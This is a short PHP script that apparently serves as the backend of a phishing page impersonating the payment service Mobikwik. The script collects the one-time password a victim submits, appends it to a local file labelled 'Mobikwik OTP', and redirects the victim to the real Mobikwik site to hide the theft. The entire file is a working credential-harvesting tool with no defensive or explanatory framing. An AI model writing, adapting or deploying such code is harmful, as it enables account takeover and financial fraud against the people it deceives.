<?php
file_put_contents("otp.txt", "Mobikwik OTP : " .  $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://www.mobikwik.com/');
?>
